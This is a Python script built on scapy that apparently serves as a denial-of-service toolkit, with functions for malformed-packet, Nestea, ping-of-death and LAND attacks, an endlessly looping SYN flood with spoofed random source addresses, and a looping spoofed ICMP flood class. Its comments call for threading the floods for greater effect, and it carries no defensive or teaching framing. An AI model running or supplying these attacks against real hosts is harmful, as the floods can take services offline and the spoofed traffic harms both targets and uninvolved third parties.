#!/usr/bin/python3
from scapy.all import *
import sys
import subprocess
import multiprocessing


# perform = True


def malformed_pkt(target):
    send(IP(dst=target, ihl=2, version=3) / ICMP())


def nestea(target):
    send(IP(dst=target, id=42, flags="MF") / UDP() / ("X" * 10))
    send(IP(dst=target, id=42, frag=48) / ("X" * 116))
    send(IP(dst=target, id=42, flags="MF") / UDP() / ("X" * 224))


def pod(target):
    send(fragment(IP(dst=target) / ICMP() / ("X" * 60000)))


def land(target, p_num):
    send(IP(src=target, dst=target) / TCP(sport=p_num, dport=p_num))


# MAKE THIS THREADED FOR INCREASED EFFICIENCY


def syn_flood(target, dport_num):
    p = IP(src=RandIP(), dst=target) / TCP(sport=RandShort(), dport=dport_num, flags="S") / ""

    send(p, loop=1)


# MAKE THIS THREADED FOR INCREASED EFFICIENCY
class IcmpAttack:

    def __init__(self, target, pls):
        self.target = target
        self.pls = pls


    def start_attack(self):

        payload = "X" * self.pls

        send(IP(src=RandIP(), dst=self.target) / ICMP() / payload, verbose=False, loop=1)








# def POST_flood(target):
